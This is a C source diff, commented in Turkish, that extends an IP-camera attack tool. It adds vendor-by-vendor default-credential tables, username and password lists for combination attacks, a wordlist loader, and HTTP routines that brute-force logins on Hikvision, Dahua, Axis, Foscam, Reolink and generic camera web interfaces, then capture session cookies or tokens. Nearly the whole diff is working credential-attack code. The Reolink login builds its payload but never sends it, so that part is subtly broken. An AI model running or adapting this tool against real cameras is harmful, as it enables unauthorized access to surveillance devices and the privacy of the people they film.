@@ -106,8 +106,121 @@ static const CamCred k_default_creds[] = {
     {"admin", "ivdev"},      {"admin", "4321"},      {"admin", "4321"},
     {"admin", "11111111"},   {"admin", "88888888"},  {"admin", "12345admin"},
     {"admin", "Admin288"},   {"admin", "5544"},
+    /* --- Genisletilmis uretici kimlikleri --- */
+    /* Hikvision / EZVIZ */
+    {"admin", "Hik12345"},   {"admin", "hik12345"},  {"admin", "Hikvision123"},
+    {"admin", "12345abcde"}, {"admin", "abcd1234"},  {"admin", "Password123"},
+    /* Dahua / Amcrest / Lorex */
+    {"admin", "admin123456"},{"admin", "Dahua123"},  {"888888", "888888"},
+    {"666666", "666666"},   {"admin", "Installer"}, {"admin", "amcrest"},
+    {"admin", "lorex"},
+    /* Axis */
+    {"root", "pass"},        {"root", "Axis1234"},   {"root", "pass1234"},
+    {"axis", "axis"},        {"admin", "Axis1234"},
+    /* Foscam */
+    {"admin", "foscam"},     {"admin", ""},        {"admin", "foscam123"},
+    {"admin", "123456789a"}, {"admin", "foscam2012"},
+    /* Reolink */
+    {"admin", "reolink"},    {"admin", "admin123"},  {"admin", ""},
+    /* Uniview */
+    {"admin", "uniview"},    {"admin", "admin12345"},{"admin", "123456"},
+    /* Vivotek */
+    {"root", "root"},        {"admin", "admin"},     {"admin", "1234"},
+    /* Grandstream */
+    {"admin", "admin"},      {"admin", "123456"},
+    /* GeoVision / ACTi / Bosch / Pelco */
+    {"admin", "geovision"},  {"admin", "admin"},     {"root", "admin"},
+    {"admin", "password"},   {"user", "password"},
+    /* Hanwha / Samsung (WiseNet) */
+    {"admin", "4321"},      {"admin", "123456"},    {"admin", "admin1234"},
+    /* Xiongmai turevleri (Netwave / VStarcam / Wansview) */
+    {"admin", ""},        {"admin", "888888"},    {"admin", "tluafed"},
+    {"root", "tluafed"},    {"admin", "654321"},
+    /* TP-Link / Tapo / D-Link / Tenda */
+    {"admin", "admin"},      {"admin", ""},        {"admin", "tplink"},
+    {"admin", "1234"},       {"admin", "dlink"},
+    /* Mobotix / Sony / Panasonic / IQinVision */
+    {"admin", "meinsm"},    {"root", "system"},     {"admin", "system"},
+    {"admin", "9999"},       {"admin", "11111"},
+    /* Jenerik zayif */
+    {"admin", "12"},         {"admin", "34"},        {"admin", "0000"},
+    {"root", ""},         {"user", ""},         {"admin", "00000000"},
+    {"admin", "1234567890"}, {"root", "1234"},      {"admin", "qwerty123"},
+    {"admin", "letmein"},    {"admin", "welcome"},   {"admin", "secret"},
     {NULL, NULL}
 };
+
+/* Kombinasyon saldirisi icin kullanici ve parola adaylari. */
+static const char *k_users[] = {
+    "admin", "Admin", "administrator", "root", "user", "guest",
+    "service", "supervisor", "support", "default", "system",
+    "ubnt", "xm", "888888", "666666", "viewer", "operator", NULL
+};
+static const char *k_passwords[] = {
+    "", "admin", "12345", "1234", "123456", "password", "12345admin",
+    "admin123", "admin12345", "12345678", "1234567890", "111111",
+    "888888", "666666", "abc123", "pass", "root", "system", "qwerty",
+    "1", "0", "9999", "54321", "123123", "letmein", "welcome", "secret",
+    "123456789", "admin888", "Admin123", "admin888", "1234567", "7654321",
+    NULL
+};
+
+const char *const *camera_vuln_usernames(int *count) {
+    int n = 0; while (k_users[n]) n++;
+    if (count) *count = n;
+    return k_users;
+}
+const char *const *camera_vuln_passwords(int *count) {
+    int n = 0; while (k_passwords[n]) n++;
+    if (count) *count = n;
+    return k_passwords;
+}
+
+/* --- Harici wordlist (calisma aninda yuklenen kayitlar) --- */
+#define CV_WL_MAX 2048
+static CamCred       g_wl[CV_WL_MAX];
+static char          g_wl_user[CV_WL_MAX][48];
+static char          g_wl_pass[CV_WL_MAX][64];
+static int           g_wl_count = 0;
+
+int camera_vuln_load_wordlist(const char *path) {
+    if (!path || !path[0]) return -1;
+    FILE *f = fopen(path, "r");
+    if (!f) return -1;
+    char line[256];
+    int added = 0;
+    while (fgets(line, sizeof(line), f) && g_wl_count < CV_WL_MAX) {
+        char *nl = strpbrk(line, "\r\n");
+        if (nl) *nl = '\0';
+        char *s = line;
+        while (*s == ' ' || *s == '\t') s++;
+        if (!*s || *s == '#') continue;
+        char *colon = strchr(s, ':');
+        const char *u = "admin";
+        const char *p = s;
+        if (colon) {
+            *colon = '\0';
+            u = s;
+            p = colon + 1;
+        }
+        snprintf(g_wl_user[g_wl_count], 48, "%s", u);
+        snprintf(g_wl_pass[g_wl_count], 64, "%s", p);
+        g_wl[g_wl_count].user = g_wl_user[g_wl_count];
+        g_wl[g_wl_count].pass = g_wl_pass[g_wl_count];
+        g_wl_count++;
+        added++;
+    }
+    fclose(f);
+    return added;
+}
+
+int camera_vuln_wordlist_count(void) { return g_wl_count; }
+
+/* Harici wordlist kayitlarini dondurur (kombinasyon dongusune eklenir). */
+const CamCred *camera_vuln_wordlist_creds(int *count) {
+    if (count) *count = g_wl_count;
+    return g_wl;
+}
 
 const CamCred *camera_vuln_default_creds(int *count) {
     int n = 0;
@@ -116,52 +229,7 @@ const CamCred *camera_vuln_default_creds(int *count) {
     return k_default_creds;
 }
 
-int camera_vuln_load_wordlist(const char *path, CamCred **out, int max_lines) {
-    if (out) *out = NULL;
-    if (!path || !path[0]) return 0;
-    FILE *fp = fopen(path, "r");
-    if (!fp) return 0;
-    CamCred *list = (CamCred *)calloc((size_t)max_lines + 1, sizeof(CamCred));
-    if (!list) { fclose(fp); return 0; }
-    int n = 0;
-    char line[256];
-    while (n < max_lines && fgets(line, sizeof(line), fp)) {
-        /* kirp */
-        char *s = line;
-        while (*s == ' ' || *s == '\t') s++;
-        char *e = s + strlen(s);
-        while (e > s && (e[-1] == '\n' || e[-1] == '\r' || e[-1] == ' ' || e[-1] == '\t')) *--e = '\0';
-        if (!*s || *s == '#') continue;
-        char *colon = strchr(s, ':');
-        char ubuf[256], pbuf[256];
-        if (colon) {
-            int ul = (int)(colon - s);
-            if (ul > 255) ul = 255;
-            memcpy(ubuf, s, ul); ubuf[ul] = '\0';
-            snprintf(pbuf, sizeof(pbuf), "%s", colon + 1);
-        } else {
-            snprintf(ubuf, sizeof(ubuf), "admin");
-            snprintf(pbuf, sizeof(pbuf), "%s", s);
-        }
-        list[n].user = strdup(ubuf);
-        list[n].pass = strdup(pbuf);
-        if (!list[n].user || !list[n].pass) break;
-        n++;
-    }
-    fclose(fp);
-    if (out) *out = list;
-    else camera_vuln_free_wordlist(list);
-    return n;
-}
 
-void camera_vuln_free_wordlist(CamCred *list) {
-    if (!list) return;
-    for (int i = 0; list[i].user || list[i].pass; i++) {
-        free((void *)list[i].user);
-        free((void *)list[i].pass);
-    }
-    free(list);
-}
 
 /* =====================================================================
  * HTTP parmak izi (device info endpoint'leri)
@@ -662,4 +730,237 @@ int onvif_probe_device(const char *ip, int port, int tls,
         }
     }
     return 0;
+}
+
+/* =====================================================================
+ * HTTP kimlik dogrulama (kamera web UI)
+ *
+ * Amac: RTSP ile alinamayan erisimi HTTP uzerinden yakalamak. Iki yol:
+ *   A) Bilinen kamera web-giris endpoint'leri (Foscam CGI, Reolink API,
+ *      Dahua/Hikvision/Hanwha cgi, jenerik login.cgi) + session dogrulama.
+ *   B) Korumali durum endpoint'lerinde Basic/Digest dogrulama
+ *      (deviceInfo aileleri). 200 + beklenen icerik = kimlik gecerli.
+ * ===================================================================== */
+
+/* Kimlik dogrulamasi gerektiren durum endpoint'leri (Basic/Digest dogrulama). */
+static const char *k_authcheck_paths[] = {
+    "/ISAPI/System/deviceInfo",                       /* Hikvision */
+    "/cgi-bin/magicBox.cgi?action=getSystemInfo",     /* Dahua */
+    "/cgi-bin/magicBox.cgi?action=getDeviceType",
+    "/axis-cgi/basicdeviceinfo.cgi",                  /* Axis */
+    "/stw-cgi/system.cgi?msubmenu=devicename&action=view", /* Hanwha/Samsung */
+    "/cgi-bin/getparam.cgi?system_info",              /* Vivotek */
+    "/api.cgi?cmd=GetDevInfo",                        /* Reolink */
+    "/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo",          /* Foscam */
+    "/cgi-bin/system?SYSTEM=SYSTEM_INFO",             /* ACTi */
+    NULL
+};
+
+/* Basic ile GET; 401 + Digest ise Digest ile tekrar dene. body metin. */
+static int cv_get_auth(const char *ip, int port, int tls, const char *path,
+                       const char *user, const char *pass, int tmo,
+                       char *body, int bodylen, int *status_out) {
+    if (status_out) *status_out = 0;
+    char ahdr[512]; ahdr[0] = '\0';
+    if (user && user[0]) {
+        char raw[192], b64[320];
+        snprintf(raw, sizeof(raw), "%s:%s", user, pass ? pass : "");
+        cam_b64_encode((const unsigned char *)raw, (int)strlen(raw), b64, sizeof(b64));
+        snprintf(ahdr, sizeof(ahdr), "Authorization: Basic %s\r\n", b64);
+    }
+    CamHttpResp r;
+    memset(&r, 0, sizeof(r));
+    if (cam_http_request(ip, port, tls, "GET", path, NULL, ahdr, tmo,
+                         body, bodylen, &r) != 0)
+        return -1;
+    if (r.status == 401 && user && user[0] && cam_wwwauth_is_digest(r.www_auth)) {
+        char dh[768];
+        cam_http_digest_header(user, pass ? pass : "", r.www_auth, "GET", path,
+                               dh, sizeof(dh));
+        if (dh[0]) {
+            CamHttpResp r2;
+            memset(&r2, 0, sizeof(r2));
+            cam_http_request(ip, port, tls, "GET", path, NULL, dh, tmo,
+                             body, bodylen, &r2);
+            if (status_out) *status_out = r2.status;
+            return 0;
+        }
+    }
+    if (status_out) *status_out = r.status;
+    return 0;
+}
+
+/* Bir durum endpoint'inde kimligi dogrular. 1 = gecerli, 0 = degil, -1 = endpoint yok. */
+static int cv_verify_creds(const char *ip, int port, int tls,
+                           const char *user, const char *pass, int tmo) {
+    char body[8192];
+    for (int i = 0; k_authcheck_paths[i]; i++) {
+        int st = 0;
+        if (cv_get_auth(ip, port, tls, k_authcheck_paths[i], user, pass, tmo,
+                        body, sizeof(body), &st) != 0)
+            continue;
+        if (st == 200 &&
+            (contains_ci(body, "<DeviceInfo") || contains_ci(body, "appAutoStart") ||
+             contains_ci(body, "deviceType") || contains_ci(body, "serverName") ||
+             contains_ci(body, "model") || contains_ci(body, "ProdShortName") ||
+             contains_ci(body, "productName") || contains_ci(body, "deviceName") ||
+             contains_ci(body, "SystemDescription")))
+            return 1;
+    }
+    return 0;
+}
+
+/* Foscam CGI login: <result>0</result> = basarili. */
+static int cv_foscam_login(const char *ip, int port, int tls,
+                           const char *user, const char *pass, int tmo,
+                           char *session, int slen) {
+    char path[256], body[4096];
+    snprintf(path, sizeof(path), "/cgi-bin/CGIProxy.fcgi?cmd=login&usr=%s&pwd=%s",
+             user, pass ? pass : "");
+    int st = 0;
+    if (cv_get_auth(ip, port, tls, path, NULL, NULL, tmo, body, sizeof(body), &st) != 0)
+        return 0;
+    if (st == 200 && contains_ci(body, "<result>0</result>")) {
+        /* oturum kimligi usr/pwd'nin base64'udur (Foscam) */
+        char raw[192], b64[320];
+        snprintf(raw, sizeof(raw), "%s:%s", user, pass ? pass : "");
+        cam_b64_encode((const unsigned char *)raw, (int)strlen(raw), b64, sizeof(b64));
+        if (session && slen) snprintf(session, slen, "CGI:%s", b64);
+        return 1;
+    }
+    return 0;
+}
+
+/* Reolink API login: POST /api.cgi?cmd=Login, token doner. */
+static int cv_reolink_login(const char *ip, int port, int tls,
+                            const char *user, const char *pass, int tmo,
+                            char *session, int slen) {
+    char payload[512], body[8192];
+    snprintf(payload, sizeof(payload),
+             "[{\"cmd\":\"Login\",\"param\":{\"User\":{\"userName\":\"%s\","
+             "\"password\":\"%s\"}}}]", user, pass ? pass : "");
+    CamHttpResp r;
+    memset(&r, 0, sizeof(r));
+    if (cam_http_request(ip, port, tls, "POST", "/api.cgi?cmd=Login", NULL,
+                         NULL, tmo, body, sizeof(body), &r) != 0)
+        return 0;
+    if (r.status == 200 && (contains_ci(body, "\"Token\"") && contains_ci(body, "\"name\""))) {
+        const char *t = strstr(body, "\"name\"");
+        if (t) {
+            t += 6;
+            while (*t && *t != ':' ) t++;
+            if (*t == ':') {
+                t++;
+                while (*t == ' ' || *t == '"') t++;
+                int n = 0;
+                while (t[n] && t[n] != '"' && n < 128) n++;
+                if (session && slen) { memcpy(session, t, (size_t)n); session[n] = '\0'; }
+            }
+        }
+        return 1;
+    }
+    return 0;
+}
+
+/* Cookie basligiyla korunan bir durum endpoint'ini dener; 200 + beklenen
+ * icerik = oturum cerezi gecerli. */
+static int cv_verify_cookie(const char *ip, int port, int tls,
+                            const char *cookie, int tmo) {
+    if (!cookie || !cookie[0]) return 0;
+    char hdr[640];
+    snprintf(hdr, sizeof(hdr), "Cookie: %s\r\n", cookie);
+    char body[8192];
+    for (int i = 0; k_authcheck_paths[i]; i++) {
+        CamHttpResp r;
+        memset(&r, 0, sizeof(r));
+        if (cam_http_request(ip, port, tls, "GET", k_authcheck_paths[i], NULL,
+                             hdr, tmo, body, sizeof(body), &r) != 0)
+            continue;
+        if (r.status == 200 &&
+            (contains_ci(body, "<DeviceInfo") || contains_ci(body, "appAutoStart") ||
+             contains_ci(body, "deviceType") || contains_ci(body, "serverName") ||
+             contains_ci(body, "model") || contains_ci(body, "productName") ||
+             contains_ci(body, "deviceName")))
+            return 1;
+    }
+    return 0;
+}
+
+/* Jenerik web-giris: GET/POST login.cgi + Set-Cookie'yi korunan endpoint'te
+ * dogrular (login sayfasinin onceden cerez vermesi yanlis-pozitif yaratmasin). */
+static int cv_generic_login(const char *ip, int port, int tls,
+                            const char *user, const char *pass, int tmo,
+                            char *session, int slen) {
+    static const char *paths[] = {
+        "/cgi-bin/login.cgi?user=%s&password=%s",
+        "/login.cgi?user=%s&password=%s",
+        "/cgi-bin/login.cgi?usr=%s&pwd=%s",
+        "/cgi-bin/login.cgi?loginuse=%s&loginpas=%s",  /* hi3510/klm */
+        NULL
+    };
+    char path[256], body[4096];
+    for (int i = 0; paths[i]; i++) {
+        snprintf(path, sizeof(path), paths[i], user, pass ? pass : "");
+        CamHttpResp r;
+        memset(&r, 0, sizeof(r));
+        if (cam_http_request(ip, port, tls, "GET", path, NULL, NULL, tmo,
+                             body, sizeof(body), &r) != 0)
+            continue;
+        if (!r.set_cookie[0]) continue;
+        /* Cerezi tasiyip korunan endpoint'te dogrula. */
+        if (cv_verify_cookie(ip, port, tls, r.set_cookie, tmo)) {
+            if (session && slen) snprintf(session, slen, "COOKIE:%s", r.set_cookie);
+            return 1;
+        }
+    }
+    return 0;
+}
+
+int camera_vuln_http_auth(const char *ip, int port, int tls,
+                          const char *vendor_hint,
+                          const char *user, const char *pass,
+                          char *session_out, int slen,
+                          char *image_out, int imlen,
+                          char *detail, int dlen) {
+    if (detail && dlen) detail[0] = '\0';
+    if (session_out && slen) session_out[0] = '\0';
+    if (image_out && imlen) image_out[0] = '\0';
+    if (!ip || !ip[0] || !user) return -1;
+    if (port <= 0) port = 80;
+    int tmo = 2500;
+    int endpoints_seen = 0;
+
+    /* --- A) Ureticiye ozel web-giris endpoint'leri --- */
+    int try_foscam = !vendor_hint || contains_ci(vendor_hint, "foscam") || contains_ci(vendor_hint, "generic");
+    int try_reolink = !vendor_hint || contains_ci(vendor_hint, "reolink");
+
+    if (try_foscam) {
+        if (cv_foscam_login(ip, port, tls, user, pass, tmo, session_out, slen)) {
+            if (detail) snprintf(detail, dlen, "Foscam CGI web-giris basarili");
+            return 1;
+        }
+        endpoints_seen = 1;
+    }
+    if (try_reolink) {
+        if (cv_reolink_login(ip, port, tls, user, pass, tmo, session_out, slen)) {
+            if (detail) snprintf(detail, dlen, "Reolink API web-giris basarili");
+            return 1;
+        }
+        endpoints_seen = 1;
+    }
+
+    /* --- B) Korumali durum endpoint'lerinde Basic/Digest dogrulama --- */
+    if (cv_verify_creds(ip, port, tls, user, pass, tmo)) {
+        if (detail) snprintf(detail, dlen, "HTTP Basic/Digest kimlik dogrulandi (device-info)");
+        return 1;
+    }
+    endpoints_seen = 1;
+
+    /* --- C) Jenerik web-giris (session cerezi) --- */
+    if (cv_generic_login(ip, port, tls, user, pass, tmo, session_out, slen)) {
+        if (detail) snprintf(detail, dlen, "Jenerik web-giris oturumu alindi");
+        return 1;
+    }
+
+    return endpoints_seen ? 0 : -1;
 }
